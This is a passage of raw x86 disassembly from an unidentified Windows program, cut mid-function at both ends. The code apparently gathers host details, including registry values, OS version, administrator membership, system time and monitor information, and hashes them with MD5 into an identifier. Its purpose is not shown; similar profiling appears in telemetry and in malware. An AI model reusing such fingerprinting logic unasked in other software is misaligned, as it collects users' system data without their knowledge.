  401691:	ff 15 8c 50 42 00    	call   *0x42508c
  401697:	8b f0                	mov    %eax,%esi
  401699:	85 f6                	test   %esi,%esi
  40169b:	74 70                	je     0x40170d
  40169d:	68 7c 91 42 00       	push   $0x42917c
  4016a2:	56                   	push   %esi
  4016a3:	ff 15 88 50 42 00    	call   *0x425088
  4016a9:	85 c0                	test   %eax,%eax
  4016ab:	74 49                	je     0x4016f6
  4016ad:	8d 8d d8 de ff ff    	lea    -0x2128(%ebp),%ecx
  4016b3:	51                   	push   %ecx
  4016b4:	8d 95 d4 de ff ff    	lea    -0x212c(%ebp),%edx
  4016ba:	52                   	push   %edx
  4016bb:	8d 8d d0 de ff ff    	lea    -0x2130(%ebp),%ecx
  4016c1:	51                   	push   %ecx
  4016c2:	ff d0                	call   *%eax
  4016c4:	8b 85 d8 de ff ff    	mov    -0x2128(%ebp),%eax
  4016ca:	8b 95 d4 de ff ff    	mov    -0x212c(%ebp),%edx
  4016d0:	25 ff ff 00 00       	and    $0xffff,%eax
  4016d5:	50                   	push   %eax
  4016d6:	52                   	push   %edx
  4016d7:	89 85 d8 de ff ff    	mov    %eax,-0x2128(%ebp)
  4016dd:	8b 85 d0 de ff ff    	mov    -0x2130(%ebp),%eax
  4016e3:	50                   	push   %eax
  4016e4:	68 94 91 42 00       	push   $0x429194
  4016e9:	6a 1e                	push   $0x1e
  4016eb:	53                   	push   %ebx
  4016ec:	e8 b6 12 01 00       	call   0x4129a7
  4016f1:	83 c4 18             	add    $0x18,%esp
  4016f4:	eb 10                	jmp    0x401706
  4016f6:	68 50 90 42 00       	push   $0x429050
  4016fb:	6a 1e                	push   $0x1e
  4016fd:	53                   	push   %ebx
  4016fe:	e8 a4 12 01 00       	call   0x4129a7
  401703:	83 c4 0c             	add    $0xc,%esp
  401706:	56                   	push   %esi
  401707:	ff 15 90 50 42 00    	call   *0x425090
  40170d:	8d b7 18 03 00 00    	lea    0x318(%edi),%esi
  401713:	56                   	push   %esi
  401714:	89 b5 d4 de ff ff    	mov    %esi,-0x212c(%ebp)
  40171a:	ff 15 6c 51 42 00    	call   *0x42516c
  401720:	6a 00                	push   $0x0
  401722:	56                   	push   %esi
  401723:	68 02 00 00 80       	push   $0x80000002
  401728:	ba 3c 8d 42 00       	mov    $0x428d3c,%edx
  40172d:	b9 68 8d 42 00       	mov    $0x428d68,%ecx
  401732:	e8 69 18 00 00       	call   0x402fa0
  401737:	83 c4 0c             	add    $0xc,%esp
  40173a:	8d 9f 90 03 00 00    	lea    0x390(%edi),%ebx
  401740:	e8 4b 17 00 00       	call   0x402e90
  401745:	8d b7 20 05 00 00    	lea    0x520(%edi),%esi
  40174b:	e8 f0 1a 00 00       	call   0x403240
  401750:	ff 15 88 52 42 00    	call   *0x425288
  401756:	85 c0                	test   %eax,%eax
  401758:	74 13                	je     0x40176d
  40175a:	68 04 01 00 00       	push   $0x104
  40175f:	8d 8f 98 05 00 00    	lea    0x598(%edi),%ecx
  401765:	51                   	push   %ecx
  401766:	50                   	push   %eax
  401767:	ff 15 70 52 42 00    	call   *0x425270
  40176d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  401771:	bb d4 8d 42 00       	mov    $0x428dd4,%ebx
  401776:	75 05                	jne    0x40177d
  401778:	bb e0 8d 42 00       	mov    $0x428de0,%ebx
  40177d:	8d b7 96 07 00 00    	lea    0x796(%edi),%esi
  401783:	56                   	push   %esi
  401784:	ff 15 6c 51 42 00    	call   *0x42516c
  40178a:	6a 02                	push   $0x2
  40178c:	56                   	push   %esi
  40178d:	68 01 00 00 80       	push   $0x80000001
  401792:	ba c8 8d 42 00       	mov    $0x428dc8,%edx
  401797:	8b cb                	mov    %ebx,%ecx
  401799:	e8 02 18 00 00       	call   0x402fa0
  40179e:	83 c4 0c             	add    $0xc,%esp
  4017a1:	83 f8 01             	cmp    $0x1,%eax
  4017a4:	7d 10                	jge    0x4017b6
  4017a6:	68 6c 16 43 00       	push   $0x43166c
  4017ab:	6a 32                	push   $0x32
  4017ad:	56                   	push   %esi
  4017ae:	e8 c7 14 01 00       	call   0x412c7a
  4017b3:	83 c4 0c             	add    $0xc,%esp
  4017b6:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4017ba:	bb d4 8d 42 00       	mov    $0x428dd4,%ebx
  4017bf:	75 05                	jne    0x4017c6
  4017c1:	bb e0 8d 42 00       	mov    $0x428de0,%ebx
  4017c6:	8d b7 fa 07 00 00    	lea    0x7fa(%edi),%esi
  4017cc:	56                   	push   %esi
  4017cd:	ff 15 6c 51 42 00    	call   *0x42516c
  4017d3:	6a 02                	push   $0x2
  4017d5:	56                   	push   %esi
  4017d6:	68 01 00 00 80       	push   $0x80000001
  4017db:	ba ec 8d 42 00       	mov    $0x428dec,%edx
  4017e0:	8b cb                	mov    %ebx,%ecx
  4017e2:	e8 b9 17 00 00       	call   0x402fa0
  4017e7:	83 c4 0c             	add    $0xc,%esp
  4017ea:	83 f8 01             	cmp    $0x1,%eax
  4017ed:	7d 10                	jge    0x4017ff
  4017ef:	68 d0 16 43 00       	push   $0x4316d0
  4017f4:	6a 32                	push   $0x32
  4017f6:	56                   	push   %esi
  4017f7:	e8 7e 14 01 00       	call   0x412c7a
  4017fc:	83 c4 0c             	add    $0xc,%esp
  4017ff:	8b 45 0c             	mov    0xc(%ebp),%eax
  401802:	6a 0a                	push   $0xa
  401804:	6a 32                	push   $0x32
  401806:	8d 97 5e 08 00 00    	lea    0x85e(%edi),%edx
  40180c:	52                   	push   %edx
  40180d:	50                   	push   %eax
  40180e:	e8 a9 15 01 00       	call   0x412dbc
  401813:	83 c4 10             	add    $0x10,%esp
  401816:	ff 15 64 51 42 00    	call   *0x425164
  40181c:	6a 0a                	push   $0xa
  40181e:	6a 1e                	push   $0x1e
  401820:	8d 8f 30 09 00 00    	lea    0x930(%edi),%ecx
  401826:	51                   	push   %ecx
  401827:	50                   	push   %eax
  401828:	e8 8f 15 01 00       	call   0x412dbc
  40182d:	33 c0                	xor    %eax,%eax
  40182f:	83 c4 10             	add    $0x10,%esp
  401832:	68 38 91 42 00       	push   $0x429138
  401837:	68 4c 91 42 00       	push   $0x42914c
  40183c:	89 85 98 de ff ff    	mov    %eax,-0x2168(%ebp)
  401842:	89 85 9c de ff ff    	mov    %eax,-0x2164(%ebp)
  401848:	89 85 a0 de ff ff    	mov    %eax,-0x2160(%ebp)
  40184e:	89 85 a4 de ff ff    	mov    %eax,-0x215c(%ebp)
  401854:	89 85 a8 de ff ff    	mov    %eax,-0x2158(%ebp)
  40185a:	89 85 ac de ff ff    	mov    %eax,-0x2154(%ebp)
  401860:	89 85 b0 de ff ff    	mov    %eax,-0x2150(%ebp)
  401866:	89 85 b4 de ff ff    	mov    %eax,-0x214c(%ebp)
  40186c:	89 85 b8 de ff ff    	mov    %eax,-0x2148(%ebp)
  401872:	ff 15 2c 51 42 00    	call   *0x42512c
  401878:	50                   	push   %eax
  401879:	ff 15 88 50 42 00    	call   *0x425088
  40187f:	85 c0                	test   %eax,%eax
  401881:	74 0b                	je     0x40188e
  401883:	8d 95 98 de ff ff    	lea    -0x2168(%ebp),%edx
  401889:	52                   	push   %edx
  40188a:	ff d0                	call   *%eax
  40188c:	eb 0d                	jmp    0x40189b
  40188e:	8d 85 98 de ff ff    	lea    -0x2168(%ebp),%eax
  401894:	50                   	push   %eax
  401895:	ff 15 84 50 42 00    	call   *0x425084
  40189b:	8b 85 98 de ff ff    	mov    -0x2168(%ebp),%eax
  4018a1:	b9 06 00 00 00       	mov    $0x6,%ecx
  4018a6:	66 3b c8             	cmp    %ax,%cx
  4018a9:	74 0a                	je     0x4018b5
  4018ab:	ba 09 00 00 00       	mov    $0x9,%edx
  4018b0:	66 3b d0             	cmp    %ax,%dx
  4018b3:	75 10                	jne    0x4018c5
  4018b5:	68 fc 8d 42 00       	push   $0x428dfc
  4018ba:	6a 1e                	push   $0x1e
  4018bc:	8d 87 6c 09 00 00    	lea    0x96c(%edi),%eax
  4018c2:	50                   	push   %eax
  4018c3:	eb 0e                	jmp    0x4018d3
  4018c5:	68 04 8e 42 00       	push   $0x428e04
  4018ca:	6a 1e                	push   $0x1e
  4018cc:	8d 8f 6c 09 00 00    	lea    0x96c(%edi),%ecx
  4018d2:	51                   	push   %ecx
  4018d3:	e8 a2 13 01 00       	call   0x412c7a
  4018d8:	8d 97 a8 09 00 00    	lea    0x9a8(%edi),%edx
  4018de:	83 c4 0c             	add    $0xc,%esp
  4018e1:	52                   	push   %edx
  4018e2:	e8 d9 13 00 00       	call   0x402cc0
  4018e7:	83 c4 04             	add    $0x4,%esp
  4018ea:	8d 85 d8 de ff ff    	lea    -0x2128(%ebp),%eax
  4018f0:	50                   	push   %eax
  4018f1:	6a 00                	push   $0x0
  4018f3:	6a 00                	push   $0x0
  4018f5:	6a 00                	push   $0x0
  4018f7:	6a 00                	push   $0x0
  4018f9:	6a 00                	push   $0x0
  4018fb:	6a 00                	push   $0x0
  4018fd:	68 20 02 00 00       	push   $0x220
  401902:	6a 20                	push   $0x20
  401904:	6a 02                	push   $0x2
  401906:	8d 8d ec fd ff ff    	lea    -0x214(%ebp),%ecx
  40190c:	51                   	push   %ecx
  40190d:	c7 85 ec fd ff ff 00 	movl   $0x0,-0x214(%ebp)
  401914:	00 00 00 
  401917:	66 c7 85 f0 fd ff ff 	movw   $0x500,-0x210(%ebp)
  40191e:	00 05 
  401920:	ff 15 28 50 42 00    	call   *0x425028
  401926:	89 85 d0 de ff ff    	mov    %eax,-0x2130(%ebp)
  40192c:	85 c0                	test   %eax,%eax
  40192e:	74 29                	je     0x401959
  401930:	8b 85 d8 de ff ff    	mov    -0x2128(%ebp),%eax
  401936:	8d 95 d0 de ff ff    	lea    -0x2130(%ebp),%edx
  40193c:	52                   	push   %edx
  40193d:	50                   	push   %eax
  40193e:	6a 00                	push   $0x0
  401940:	ff 15 24 50 42 00    	call   *0x425024
  401946:	8b 8d d8 de ff ff    	mov    -0x2128(%ebp),%ecx
  40194c:	51                   	push   %ecx
  40194d:	ff 15 20 50 42 00    	call   *0x425020
  401953:	8b 85 d0 de ff ff    	mov    -0x2130(%ebp),%eax
  401959:	83 f8 01             	cmp    $0x1,%eax
  40195c:	8d 87 0c 0a 00 00    	lea    0xa0c(%edi),%eax
  401962:	89 85 d8 de ff ff    	mov    %eax,-0x2128(%ebp)
  401968:	75 07                	jne    0x401971
  40196a:	68 0c 8e 42 00       	push   $0x428e0c
  40196f:	eb 05                	jmp    0x401976
  401971:	68 10 8e 42 00       	push   $0x428e10
  401976:	6a 05                	push   $0x5
  401978:	50                   	push   %eax
  401979:	e8 fc 12 01 00       	call   0x412c7a
  40197e:	83 c4 0c             	add    $0xc,%esp
  401981:	e8 ba 10 00 00       	call   0x402a40
  401986:	85 c0                	test   %eax,%eax
  401988:	74 10                	je     0x40199a
  40198a:	68 0c 8e 42 00       	push   $0x428e0c
  40198f:	6a 0a                	push   $0xa
  401991:	8d 97 16 0a 00 00    	lea    0xa16(%edi),%edx
  401997:	52                   	push   %edx
  401998:	eb 0e                	jmp    0x4019a8
  40199a:	68 10 8e 42 00       	push   $0x428e10
  40199f:	6a 0a                	push   $0xa
  4019a1:	8d 87 16 0a 00 00    	lea    0xa16(%edi),%eax
  4019a7:	50                   	push   %eax
  4019a8:	e8 cd 12 01 00       	call   0x412c7a
  4019ad:	8d 8f 2a 0a 00 00    	lea    0xa2a(%edi),%ecx
  4019b3:	83 c4 0c             	add    $0xc,%esp
  4019b6:	51                   	push   %ecx
  4019b7:	e8 84 0c 00 00       	call   0x402640
  4019bc:	83 c4 04             	add    $0x4,%esp
  4019bf:	e8 9c 09 00 00       	call   0x402360
  4019c4:	be 0c 8e 42 00       	mov    $0x428e0c,%esi
  4019c9:	85 c0                	test   %eax,%eax
  4019cb:	75 05                	jne    0x4019d2
  4019cd:	be 10 8e 42 00       	mov    $0x428e10,%esi
  4019d2:	e8 d9 07 00 00       	call   0x4021b0
  4019d7:	8b 1d bc 52 42 00    	mov    0x4252bc,%ebx
  4019dd:	50                   	push   %eax
  4019de:	56                   	push   %esi
  4019df:	8d 97 28 0c 00 00    	lea    0xc28(%edi),%edx
  4019e5:	68 14 8e 42 00       	push   $0x428e14
  4019ea:	52                   	push   %edx
  4019eb:	ff d3                	call   *%ebx
  4019ed:	83 c4 10             	add    $0x10,%esp
  4019f0:	8d 85 dc fd ff ff    	lea    -0x224(%ebp),%eax
  4019f6:	50                   	push   %eax
  4019f7:	ff 15 60 51 42 00    	call   *0x425160
  4019fd:	0f b7 8d e8 fd ff ff 	movzwl -0x218(%ebp),%ecx
  401a04:	0f b7 95 e6 fd ff ff 	movzwl -0x21a(%ebp),%edx
  401a0b:	0f b7 85 e4 fd ff ff 	movzwl -0x21c(%ebp),%eax
  401a12:	51                   	push   %ecx
  401a13:	0f b7 8d e2 fd ff ff 	movzwl -0x21e(%ebp),%ecx
  401a1a:	52                   	push   %edx
  401a1b:	0f b7 95 de fd ff ff 	movzwl -0x222(%ebp),%edx
  401a22:	50                   	push   %eax
  401a23:	0f b7 85 dc fd ff ff 	movzwl -0x224(%ebp),%eax
  401a2a:	51                   	push   %ecx
  401a2b:	8b 8d bc de ff ff    	mov    -0x2144(%ebp),%ecx
  401a31:	52                   	push   %edx
  401a32:	50                   	push   %eax
  401a33:	51                   	push   %ecx
  401a34:	8d 97 c2 08 00 00    	lea    0x8c2(%edi),%edx
  401a3a:	68 20 8e 42 00       	push   $0x428e20
  401a3f:	52                   	push   %edx
  401a40:	ff d3                	call   *%ebx
  401a42:	83 c4 24             	add    $0x24,%esp
  401a45:	8d b7 26 09 00 00    	lea    0x926(%edi),%esi
  401a4b:	68 68 8e 42 00       	push   $0x428e68
  401a50:	56                   	push   %esi
  401a51:	ff d3                	call   *%ebx
  401a53:	83 c4 08             	add    $0x8,%esp
  401a56:	6a 40                	push   $0x40
  401a58:	8d 87 8c 0c 00 00    	lea    0xc8c(%edi),%eax
  401a5e:	50                   	push   %eax
  401a5f:	6a 02                	push   $0x2
  401a61:	68 00 08 00 00       	push   $0x800
  401a66:	ff 15 5c 51 42 00    	call   *0x42515c
  401a6c:	68 00 1e 00 00       	push   $0x1e00
  401a71:	8d 8d e0 de ff ff    	lea    -0x2120(%ebp),%ecx
  401a77:	6a 00                	push   $0x0
  401a79:	51                   	push   %ecx
  401a7a:	e8 b1 27 01 00       	call   0x414230
  401a7f:	83 c4 0c             	add    $0xc,%esp
  401a82:	8d 95 dc de ff ff    	lea    -0x2124(%ebp),%edx
  401a88:	52                   	push   %edx
  401a89:	68 90 1d 40 00       	push   $0x401d90
  401a8e:	6a 00                	push   $0x0
  401a90:	6a 00                	push   $0x0
  401a92:	c7 85 dc de ff ff 00 	movl   $0x0,-0x2124(%ebp)
  401a99:	00 00 00 
  401a9c:	ff 15 b8 52 42 00    	call   *0x4252b8
  401aa2:	8d 85 dc de ff ff    	lea    -0x2124(%ebp),%eax
  401aa8:	81 c7 cc 0c 00 00    	add    $0xccc,%edi
  401aae:	50                   	push   %eax
  401aaf:	e8 dc 03 00 00       	call   0x401e90
  401ab4:	8b bd c0 de ff ff    	mov    -0x2140(%ebp),%edi
  401aba:	6a 32                	push   $0x32
  401abc:	8d 8f ca 0e 00 00    	lea    0xeca(%edi),%ecx
  401ac2:	51                   	push   %ecx
  401ac3:	ff 15 58 51 42 00    	call   *0x425158
  401ac9:	8d 95 e4 fc ff ff    	lea    -0x31c(%ebp),%edx
  401acf:	52                   	push   %edx
  401ad0:	ff 15 3c 50 42 00    	call   *0x42503c
  401ad6:	85 c0                	test   %eax,%eax
  401ad8:	74 25                	je     0x401aff
  401ada:	8b 8d d4 de ff ff    	mov    -0x212c(%ebp),%ecx
  401ae0:	8b 95 c8 de ff ff    	mov    -0x2138(%ebp),%edx
  401ae6:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  401aec:	50                   	push   %eax
  401aed:	8b 85 cc de ff ff    	mov    -0x2134(%ebp),%eax
  401af3:	51                   	push   %ecx
  401af4:	52                   	push   %edx
  401af5:	50                   	push   %eax
  401af6:	8d 8f 2e 0f 00 00    	lea    0xf2e(%edi),%ecx
  401afc:	51                   	push   %ecx
  401afd:	eb 1e                	jmp    0x401b1d
  401aff:	8b 95 d4 de ff ff    	mov    -0x212c(%ebp),%edx
  401b05:	8b 85 c8 de ff ff    	mov    -0x2138(%ebp),%eax
  401b0b:	8b 8d cc de ff ff    	mov    -0x2134(%ebp),%ecx
  401b11:	6a 00                	push   $0x0
  401b13:	52                   	push   %edx
  401b14:	50                   	push   %eax
  401b15:	51                   	push   %ecx
  401b16:	8d 97 2e 0f 00 00    	lea    0xf2e(%edi),%edx
  401b1c:	52                   	push   %edx
  401b1d:	8b 95 d8 de ff ff    	mov    -0x2128(%ebp),%edx
  401b23:	8b ce                	mov    %esi,%ecx
  401b25:	e8 36 00 00 00       	call   0x401b60
  401b2a:	8b 8d c4 de ff ff    	mov    -0x213c(%ebp),%ecx
  401b30:	8b 01                	mov    (%ecx),%eax
  401b32:	8b 50 08             	mov    0x8(%eax),%edx
  401b35:	83 c4 14             	add    $0x14,%esp
  401b38:	68 90 0f 00 00       	push   $0xf90
  401b3d:	57                   	push   %edi
  401b3e:	ff d2                	call   *%edx
  401b40:	57                   	push   %edi
  401b41:	8b f0                	mov    %eax,%esi
  401b43:	e8 85 09 01 00       	call   0x4124cd
  401b48:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401b4b:	83 c4 04             	add    $0x4,%esp
  401b4e:	5f                   	pop    %edi
  401b4f:	8b c6                	mov    %esi,%eax
  401b51:	5e                   	pop    %esi
  401b52:	33 cd                	xor    %ebp,%ecx
  401b54:	5b                   	pop    %ebx
  401b55:	e8 45 08 01 00       	call   0x41239f
  401b5a:	8b e5                	mov    %ebp,%esp
  401b5c:	5d                   	pop    %ebp
  401b5d:	c3                   	ret
  401b5e:	cc                   	int3
  401b5f:	cc                   	int3
  401b60:	55                   	push   %ebp
  401b61:	8b ec                	mov    %esp,%ebp
  401b63:	6a ff                	push   $0xffffffff
  401b65:	68 c8 3f 42 00       	push   $0x423fc8
  401b6a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401b70:	50                   	push   %eax
  401b71:	81 ec b8 00 00 00    	sub    $0xb8,%esp
  401b77:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  401b7c:	33 c5                	xor    %ebp,%eax
  401b7e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401b81:	53                   	push   %ebx
  401b82:	56                   	push   %esi
  401b83:	57                   	push   %edi
  401b84:	50                   	push   %eax
  401b85:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401b88:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401b8e:	8b 45 08             	mov    0x8(%ebp),%eax
  401b91:	8b 75 10             	mov    0x10(%ebp),%esi
  401b94:	8b 5d 14             	mov    0x14(%ebp),%ebx
  401b97:	89 8d 3c ff ff ff    	mov    %ecx,-0xc4(%ebp)
  401b9d:	8b 4d 18             	mov    0x18(%ebp),%ecx
  401ba0:	89 8d 44 ff ff ff    	mov    %ecx,-0xbc(%ebp)
  401ba6:	33 c9                	xor    %ecx,%ecx
  401ba8:	89 95 40 ff ff ff    	mov    %edx,-0xc0(%ebp)
  401bae:	33 d2                	xor    %edx,%edx
  401bb0:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
  401bb6:	8b 45 0c             	mov    0xc(%ebp),%eax
  401bb9:	c7 45 e8 07 00 00 00 	movl   $0x7,-0x18(%ebp)
  401bc0:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  401bc3:	66 89 55 d4          	mov    %dx,-0x2c(%ebp)
  401bc7:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401bca:	8b c8                	mov    %eax,%ecx
  401bcc:	8d 51 02             	lea    0x2(%ecx),%edx
  401bcf:	90                   	nop
  401bd0:	66 8b 39             	mov    (%ecx),%di
  401bd3:	83 c1 02             	add    $0x2,%ecx
  401bd6:	66 85 ff             	test   %di,%di
  401bd9:	75 f5                	jne    0x401bd0
  401bdb:	2b ca                	sub    %edx,%ecx
  401bdd:	d1 f9                	sar    $1,%ecx
  401bdf:	51                   	push   %ecx
  401be0:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401be3:	e8 08 1f 00 00       	call   0x403af0
  401be8:	8b c6                	mov    %esi,%eax
  401bea:	8d 50 02             	lea    0x2(%eax),%edx
  401bed:	8d 49 00             	lea    0x0(%ecx),%ecx
  401bf0:	66 8b 08             	mov    (%eax),%cx
  401bf3:	83 c0 02             	add    $0x2,%eax
  401bf6:	66 85 c9             	test   %cx,%cx
  401bf9:	75 f5                	jne    0x401bf0
  401bfb:	2b c2                	sub    %edx,%eax
  401bfd:	d1 f8                	sar    $1,%eax
  401bff:	50                   	push   %eax
  401c00:	8b c6                	mov    %esi,%eax
  401c02:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401c05:	e8 e6 1e 00 00       	call   0x403af0
  401c0a:	8b c3                	mov    %ebx,%eax
  401c0c:	8d 50 02             	lea    0x2(%eax),%edx
  401c0f:	90                   	nop
  401c10:	66 8b 08             	mov    (%eax),%cx
  401c13:	83 c0 02             	add    $0x2,%eax
  401c16:	66 85 c9             	test   %cx,%cx
  401c19:	75 f5                	jne    0x401c10
  401c1b:	2b c2                	sub    %edx,%eax
  401c1d:	d1 f8                	sar    $1,%eax
  401c1f:	50                   	push   %eax
  401c20:	8b c3                	mov    %ebx,%eax
  401c22:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401c25:	e8 c6 1e 00 00       	call   0x403af0
  401c2a:	8b 95 3c ff ff ff    	mov    -0xc4(%ebp),%edx
  401c30:	8b c2                	mov    %edx,%eax
  401c32:	8d 70 02             	lea    0x2(%eax),%esi
  401c35:	66 8b 08             	mov    (%eax),%cx
  401c38:	83 c0 02             	add    $0x2,%eax
  401c3b:	66 85 c9             	test   %cx,%cx
  401c3e:	75 f5                	jne    0x401c35
  401c40:	2b c6                	sub    %esi,%eax
  401c42:	d1 f8                	sar    $1,%eax
  401c44:	50                   	push   %eax
  401c45:	8b c2                	mov    %edx,%eax
  401c47:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401c4a:	e8 a1 1e 00 00       	call   0x403af0
  401c4f:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  401c55:	8b c2                	mov    %edx,%eax
  401c57:	8d 70 02             	lea    0x2(%eax),%esi
  401c5a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401c60:	66 8b 08             	mov    (%eax),%cx
  401c63:	83 c0 02             	add    $0x2,%eax
  401c66:	66 85 c9             	test   %cx,%cx
  401c69:	75 f5                	jne    0x401c60
  401c6b:	2b c6                	sub    %esi,%eax
  401c6d:	d1 f8                	sar    $1,%eax
  401c6f:	50                   	push   %eax
  401c70:	8b c2                	mov    %edx,%eax
  401c72:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401c75:	e8 76 1e 00 00       	call   0x403af0
  401c7a:	8b 95 44 ff ff ff    	mov    -0xbc(%ebp),%edx
  401c80:	8b c2                	mov    %edx,%eax
  401c82:	8d 70 02             	lea    0x2(%eax),%esi
  401c85:	66 8b 08             	mov    (%eax),%cx
  401c88:	83 c0 02             	add    $0x2,%eax
  401c8b:	66 85 c9             	test   %cx,%cx
  401c8e:	75 f5                	jne    0x401c85
  401c90:	2b c6                	sub    %esi,%eax
  401c92:	d1 f8                	sar    $1,%eax
  401c94:	50                   	push   %eax
  401c95:	8b c2                	mov    %edx,%eax
  401c97:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401c9a:	e8 51 1e 00 00       	call   0x403af0
  401c9f:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  401ca3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401ca6:	73 03                	jae    0x401cab
  401ca8:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401cab:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401cae:	33 db                	xor    %ebx,%ebx
  401cb0:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  401cb4:	51                   	push   %ecx
  401cb5:	8d b5 4c ff ff ff    	lea    -0xb4(%ebp),%esi
  401cbb:	c6 45 b4 00          	movb   $0x0,-0x4c(%ebp)
  401cbf:	89 9d 60 ff ff ff    	mov    %ebx,-0xa0(%ebp)
  401cc5:	89 9d 5c ff ff ff    	mov    %ebx,-0xa4(%ebp)
  401ccb:	c7 85 4c ff ff ff 01 	movl   $0x67452301,-0xb4(%ebp)
  401cd2:	23 45 67 
  401cd5:	c7 85 50 ff ff ff 89 	movl   $0xefcdab89,-0xb0(%ebp)
  401cdc:	ab cd ef 
  401cdf:	c7 85 54 ff ff ff fe 	movl   $0x98badcfe,-0xac(%ebp)
  401ce6:	dc ba 98 
  401ce9:	c7 85 58 ff ff ff 76 	movl   $0x10325476,-0xa8(%ebp)
  401cf0:	54 32 10 
  401cf3:	e8 38 29 00 00       	call   0x404630
  401cf8:	8d 7d b8             	lea    -0x48(%ebp),%edi
  401cfb:	8b c6                	mov    %esi,%eax
  401cfd:	e8 ce 32 00 00       	call   0x404fd0
  401d02:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401d05:	bf 10 00 00 00       	mov    $0x10,%edi
  401d0a:	39 7d cc             	cmp    %edi,-0x34(%ebp)
  401d0d:	73 03                	jae    0x401d12
  401d0f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401d12:	8b 35 68 51 42 00    	mov    0x425168,%esi
  401d18:	53                   	push   %ebx
  401d19:	53                   	push   %ebx
  401d1a:	6a ff                	push   $0xffffffff
  401d1c:	50                   	push   %eax
  401d1d:	53                   	push   %ebx
  401d1e:	53                   	push   %ebx
  401d1f:	ff d6                	call   *%esi
  401d21:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  401d24:	39 7d cc             	cmp    %edi,-0x34(%ebp)
  401d27:	73 03                	jae    0x401d2c
  401d29:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401d2c:	50                   	push   %eax
  401d2d:	8b 85 48 ff ff ff    	mov    -0xb8(%ebp),%eax
  401d33:	50                   	push   %eax
  401d34:	6a ff                	push   $0xffffffff
  401d36:	51                   	push   %ecx
  401d37:	53                   	push   %ebx
  401d38:	53                   	push   %ebx
  401d39:	ff d6                	call   *%esi
  401d3b:	39 7d cc             	cmp    %edi,-0x34(%ebp)
  401d3e:	72 0c                	jb     0x401d4c
  401d40:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  401d43:	51                   	push   %ecx
  401d44:	e8 84 07 01 00       	call   0x4124cd
  401d49:	83 c4 04             	add    $0x4,%esp
  401d4c:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401d53:	83 7d e8 08          	cmpl   $0x8,-0x18(%ebp)
  401d57:	c7 45 cc 0f 00 00 00 	movl   $0xf,-0x34(%ebp)
  401d5e:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  401d61:	88 5d b8             	mov    %bl,-0x48(%ebp)
  401d64:	72 0c                	jb     0x401d72
  401d66:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401d69:	52                   	push   %edx
  401d6a:	e8 5e 07 01 00       	call   0x4124cd
  401d6f:	83 c4 04             	add    $0x4,%esp
  401d72:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401d75:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401d7c:	59                   	pop    %ecx
  401d7d:	5f                   	pop    %edi
  401d7e:	5e                   	pop    %esi
  401d7f:	5b                   	pop    %ebx
  401d80:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401d83:	33 cd                	xor    %ebp,%ecx
  401d85:	e8 15 06 01 00       	call   0x41239f
  401d8a:	8b e5                	mov    %ebp,%esp
  401d8c:	5d                   	pop    %ebp
  401d8d:	c3                   	ret
  401d8e:	cc                   	int3
  401d8f:	cc                   	int3
  401d90:	55                   	push   %ebp
  401d91:	8b ec                	mov    %esp,%ebp
  401d93:	83 e4 f8             	and    $0xfffffff8,%esp
  401d96:	83 ec 70             	sub    $0x70,%esp
  401d99:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  401d9e:	33 c4                	xor    %esp,%eax
  401da0:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  401da4:	56                   	push   %esi
  401da5:	8b 75 14             	mov    0x14(%ebp),%esi
  401da8:	57                   	push   %edi
  401da9:	8b 7d 08             	mov    0x8(%ebp),%edi
  401dac:	6a 68                	push   $0x68
  401dae:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401db2:	6a 00                	push   $0x0
  401db4:	50                   	push   %eax
  401db5:	e8 76 24 01 00       	call   0x414230
  401dba:	83 c4 0c             	add    $0xc,%esp
  401dbd:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401dc1:	51                   	push   %ecx
  401dc2:	57                   	push   %edi
  401dc3:	c7 44 24 10 68 00 00 	movl   $0x68,0x10(%esp)
  401dca:	00 
  401dcb:	ff 15 74 52 42 00    	call   *0x425274
  401dd1:	8b 06                	mov    (%esi),%eax
  401dd3:	83 f8 3f             	cmp    $0x3f,%eax
  401dd6:	0f 83 9d 00 00 00    	jae    0x401e79
  401ddc:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401ddf:	8b d0                	mov    %eax,%edx
  401de1:	c1 e2 04             	shl    $0x4,%edx
  401de4:	2b d0                	sub    %eax,%edx
  401de6:	8d 44 d6 04          	lea    0x4(%esi,%edx,8),%eax
  401dea:	89 38                	mov    %edi,(%eax)
  401dec:	85 c9                	test   %ecx,%ecx
